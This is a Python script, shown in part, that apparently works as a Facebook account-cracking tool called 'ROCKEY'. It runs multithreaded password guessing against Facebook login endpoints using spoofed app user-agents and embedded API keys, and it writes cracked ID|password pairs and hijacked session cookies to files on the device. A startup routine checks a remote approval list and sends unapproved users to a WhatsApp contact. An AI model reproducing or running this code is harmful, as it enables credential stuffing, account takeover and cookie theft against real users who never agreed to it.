...
from concurrent.futures import ThreadPoolExecutor as mogidROCKEY
from string import * 
...
sys.stdout.write('\x1b]2; ROCKEY\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;31mâ€¢\033[1;37m]\033[1;31mDEVELOPER    :   \033[1;31mROCKEY-BADSHA
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("-----------------------------------------------------")
        input("Press enter to back ROCKEY Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[ROCKEY] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent':'[FBAN/FB4A;FBAV/361.0.0.4168;FBBV/7878895;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184959;FBDM/{density=1.875,width=720,height=1475};FBLC/en_US;FBRV/348936652;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2111;FBSV/11;FBOP/1;FBCA/arm64-v8a:]',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ROCKEYb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ROCKEYb};{ckkk}"
                    print(f"\r{R} [ROCKEY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROCKEY_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ROCKEY_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [ROCKEY-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ROCKEY_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[ROCKEY] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ROCKEY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROCKEY_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ROCKEY_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [ROCKEY-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r\033[1;32m[ROCKEY] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ROCKEY-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROCKEY_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print("-----------------------------------------------------")
            with mogidROCKEY(max_workers=30) as ROCKEYworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ROCKEYworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ROCKEYworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ROCKEYworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ROCKEYworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def ROCKEY_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://raw.githubusercontent.com/jaikumarhero/approvel1.txt/main/APPROVEL.txt").text
    if id in DARK:
        ROCKEY()
    else:
        os.system("clear")
        ...
        os.system("xdg-open https://wa.me/+923042376602")
        ROCKEY_menu()   
ROCKEY_menu()
